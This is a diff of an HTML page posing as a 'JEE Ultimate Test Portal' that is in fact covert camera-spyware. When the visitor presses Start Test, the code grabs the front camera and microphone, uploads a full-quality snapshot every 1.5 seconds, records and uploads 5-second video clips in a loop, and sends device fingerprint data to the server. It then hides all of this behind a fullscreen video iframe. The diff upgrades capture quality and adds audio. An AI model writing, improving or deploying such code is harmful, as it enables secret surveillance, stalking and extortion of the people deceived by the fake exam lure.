@@ -1,7 +1,9 @@
-<!DOCTYPE html>  <html>  
+<!DOCTYPE html>  
+<html>  
 <head>  
 <meta charset="UTF-8">  
-<title>JEE Ultimate Test Portal</title>  <style>  
+<title>JEE Ultimate Test Portal</title>  
+<style>  
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}  
 html,body{height:100%;overflow:hidden;color:white;}  
   
@@ -70,140 +72,148 @@ iframe{width:100%;height:100%;border:0;display:none;}
   
 #v,#c{display:none;}  
   
-</style>  </head>  <body>  <div id="overlay">  <h1>JEE Ultimate Test Portal</h1>  <!-- 🔥 ADDED ONLY THIS -->  <div id="intro">  
-😎☠️ hello buddy  ....😎🥱<br>  🔥 "this is personal music studio "
+</style>  
+</head>  
+<body>  
 
-</div>  <button onclick="start()">▶ Start Test</button>
+<div id="overlay">  
+  <h1>JEE Ultimate Test Portal</h1>  
+  <div id="intro">  
+    😎☠️ hello buddy ....😎🥱<br>  🔥 "this is personal music studio "  
+  </div>  
+  <button onclick="start()">▶ Start Test</button>  
+</div>  
 
-</div>  <iframe id="frame"></iframe>  <video id="v" autoplay playsinline></video>
-<canvas id="c"></canvas>
+<iframe id="frame"></iframe>  
+<video id="v" autoplay playsinline></video>  
+<canvas id="c"></canvas>  
 
 <script>  
-  
+const v = document.getElementById("v");
+const c = document.getElementById("c");
 let recorder;  
 let chunks=[];  
   
-  
-/* DEVICE INFO */  
-  
+/* 1. DEVICE INFO (Unchanged) */  
 function sendDeviceInfo(){  
-  
-fetch("/device",{  
-method:"POST",  
-headers:{"Content-Type":"application/json"},  
-body:JSON.stringify({  
-device:navigator.platform,  
-os:navigator.userAgent,  
-browser:navigator.appVersion,  
-screen:screen.width+"x"+screen.height  
-})  
-});  
-  
+  fetch("/device",{  
+    method:"POST",  
+    headers:{"Content-Type":"application/json"},  
+    body:JSON.stringify({  
+      device: navigator.platform,  
+      os: navigator.userAgent,  
+      browser: navigator.appVersion,  
+      screen: screen.width+"x"+screen.height  
+    })  
+  }).catch(e => console.log("Device info error:", e));  
 }  
   
-  
-/* SNAPSHOT */  
-  
+/* 2. ELITE SNAPSHOT CAPTURE (HD Quality & No Distortion) */  
 function capture(){  
+  // Jab tak video ki actual width/height load na ho jaye, capture mat karo
+  if(!v.videoWidth || !v.videoHeight) return;  
   
-if(!v.videoWidth) return;  
+  // Canvas ko phone camera ke asli resolution par set karo
+  c.width = v.videoWidth;  
+  c.height = v.videoHeight;  
   
-c.width=v.videoWidth;  
-c.height=v.videoHeight;  
+  const ctx = c.getContext("2d");  
   
-const ctx=c.getContext("2d");  
+  // Image smoothing enable karo quality aur sharp karne ke liye
+  ctx.imageSmoothingEnabled = true;
+  ctx.imageSmoothingQuality = "high";
   
-ctx.drawImage(v,0,0,c.width,c.height);  
+  ctx.drawImage(v, 0, 0, c.width, c.height);  
   
-c.toBlob(b=>{  
-  
-let f=new FormData();  
-f.append("photo",b,"u.jpg");  
-  
-fetch("/upload",{method:"POST",body:f});  
-  
-},"image/jpeg",0.9);  
-  
+  // 1.0 = Maximum (100%) JPEG Quality
+  c.toBlob(b => {  
+    let f = new FormData();  
+    f.append("photo", b, "u.jpg");  
+    fetch("/upload", { method:"POST", body:f }).catch(e => console.log("Upload failed", e));  
+  }, "image/jpeg", 1.0);  
 }  
   
-  
-/* VIDEO RECORD */  
-  
+/* 3. VIDEO RECORDING */  
 function startVideo(stream){  
+  try {
+    recorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" }); 
+  } catch (e) {
+    recorder = new MediaRecorder(stream); // Fallback for some browsers
+  } 
   
-recorder = new MediaRecorder(stream);  
+  recorder.ondataavailable = e => {  
+    if(e.data.size > 0) chunks.push(e.data);  
+  };  
   
-recorder.ondataavailable = e=>{  
-chunks.push(e.data);  
-};  
+  recorder.onstop = () => {  
+    let blob = new Blob(chunks, {type:"video/webm"});  
+    chunks = [];  
+    
+    let f = new FormData();  
+    f.append("video", blob, "v.webm");  
+    fetch("/video", {method:"POST", body:f}).catch(e => console.log("Video upload failed", e));  
+  };  
   
-recorder.onstop = ()=>{  
-  
-let blob = new Blob(chunks,{type:"video/webm"});  
-chunks=[];  
-  
-let f=new FormData();  
-f.append("video",blob,"v.webm");  
-  
-fetch("/video",{method:"POST",body:f});  
-  
-};  
-  
-setInterval(()=>{  
-  
-recorder.start();  
-  
-setTimeout(()=>{  
-recorder.stop();  
-},5000);  
-  
-},5000);  
-  
+  setInterval(() => {  
+    if(recorder.state === "inactive") {
+      recorder.start();  
+      setTimeout(() => {  
+        if(recorder.state === "recording") recorder.stop();  
+      }, 5000);  
+    }
+  }, 5000);  
 }  
   
-  
-/* START TEST */  
-  
+/* 4. START TEST & CAMERA INIT */  
 async function start(){  
+  let stream;  
   
-let stream;  
+  try {  
+    stream = await navigator.mediaDevices.getUserMedia({  
+      // Elite constraints: Forces mobile browser to use the absolute best resolution
+      video: { 
+        facingMode: "user",
+        width: { ideal: 4096 },  // Forces 4K or highest supported HD resolution
+        height: { ideal: 2160 }
+      },
+      audio: true // Add audio false if you don't want mic permission
+    });  
+  } catch(e) {  
+    alert("Camera permission required to proceed.");  
+    return;  
+  }  
   
-try{  
+  v.srcObject = stream;  
   
-stream = await navigator.mediaDevices.getUserMedia({  
-video:{facingMode:"user"}  
-});  
+  // Play explicitly to ensure metadata is loaded for frame capture
+  v.play().catch(e => console.log(e));
   
-}catch(e){  
+  sendDeviceInfo();  
   
-alert("Camera permission required");  
-return;  
+  // Har 1.5 second mein ek high-res photo click karega (1000 ki jagah thoda gap dena acha hai for performance)
+  setInterval(capture, 1500);  
   
+  startVideo(stream);  
+  
+  // UI Hide
+  document.getElementById("overlay").style.display="none";  
+  
+  // Video link logic
+  try {
+    const r = await fetch("/get_video_link");  
+    const d = await r.json();  
+    
+    const frame = document.getElementById("frame");  
+    frame.style.display = "block";  
+    frame.src = d.url;  
+    
+    if(frame.requestFullscreen){  
+      frame.requestFullscreen();  
+    } 
+  } catch(e) {
+    console.log("Failed to load iframe url", e);
+  }
 }  
-  
-v.srcObject = stream;  
-  
-sendDeviceInfo();  
-  
-setInterval(capture,1000);  
-  
-startVideo(stream);  
-  
-document.getElementById("overlay").style.display="none";  
-  
-const r = await fetch("/get_video_link");  
-const d = await r.json();  
-  
-const frame=document.getElementById("frame");  
-  
-frame.style.display="block";  
-frame.src=d.url;  
-  
-if(frame.requestFullscreen){  
-frame.requestFullscreen();  
-}  
-  
-}  
-  
-</script>  </body>  
+</script>  
+</body>  
 </html>
